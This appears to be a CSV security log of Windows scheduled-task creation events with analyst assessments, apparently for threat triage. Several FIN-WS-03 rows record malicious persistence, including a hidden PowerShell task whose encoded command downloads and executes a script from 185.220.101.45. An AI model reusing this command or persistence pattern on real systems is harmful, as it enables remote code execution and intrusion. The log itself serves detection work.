timestamp,event_id,computer,subject_user,subject_domain,logon_id,task_name,task_command,task_arguments,task_trigger,run_level,source_ip,assessment
2026-09-20 02:00:15,4698,FIN-WS-01,svc_backup,ACME,0x5a12,\Microsoft\Windows\Backup\NightlyBackup,C:\Program Files\BackupAgent\backup.exe,--full --quiet,Daily 02:00,HighestAvailable,10.10.20.15,Benign - approved backup task
2026-09-20 03:15:44,4698,HR-WS-02,j.smith,ACME,0x7b91,\AdobeUpdateTaskMachineCore,C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe,/scheduled,Daily 03:15,LeastPrivilege,10.10.30.42,Benign - expected software update task
2026-09-20 08:35:22,4698,ENG-WS-07,m.brown,ACME,0x8c23,\Microsoft\Windows\DiskCleanup\SilentCleanup,C:\Windows\System32\cleanmgr.exe,/autoclean,Weekly Sunday 08:30,HighestAvailable,10.10.40.18,Benign - Windows maintenance task
2026-09-20 10:42:09,4698,FIN-WS-03,jsmith,ACME,0x1d77,\WindowsUpdateCheck,C:\Users\jsmith\AppData\Roaming\update.exe,--silent,At logon,HighestAvailable,185.220.101.45,Suspicious - executable launched from AppData
2026-09-20 10:44:51,4698,FIN-WS-03,jsmith,ACME,0x1d77,\MicrosoftEdgeUpdate,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,-NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUALwBwAHMAMQAnACkA,At logon,HighestAvailable,185.220.101.45,High - encoded PowerShell and external download
2026-09-20 10:48:16,4698,FIN-WS-03,jsmith,ACME,0x1d77,\SystemHealthMonitor,C:\Windows\System32\cmd.exe,/c C:\Users\jsmith\Downloads\healthcheck.bat,Every 30 minutes,HighestAvailable,185.220.101.45,Suspicious - script launched from Downloads
2026-09-20 12:10:31,4698,IT-WS-04,it.admin,ACME,0x9e55,\Microsoft\Windows\UpdateOrchestrator\AC Power Install,C:\Windows\System32\UsoClient.exe,StartInstall,Daily 12:00,HighestAvailable,10.10.10.25,Benign - approved IT maintenance task
2026-09-20 14:22:07,4698,SALES-WS-06,k.lee,ACME,0x3f88,\OneDriveSyncHelper,C:\Users\k.lee\AppData\Local\Temp\sync-helper.exe,/background,At logon,HighestAvailable,203.0.113.77,Suspicious - executable launched from Temp
2026-09-20 16:40:54,4698,OPS-SRV-01,svc_monitoring,ACME,0x2a11,\MonitoringAgentHealth,C:\Program Files\MonitoringAgent\agenthealth.exe,--check,Every 15 minutes,HighestAvailable,10.10.20.20,Benign - approved monitoring task
2026-09-20 18:05:33,4698,FIN-WS-03,jsmith,ACME,0x1d77,\WindowsTelemetry,C:\Windows\System32\wscript.exe,C:\Users\jsmith\AppData\Local\Temp\telemetry.vbs,At logon,HighestAvailable,185.220.101.45,Suspicious - script execution from Temp
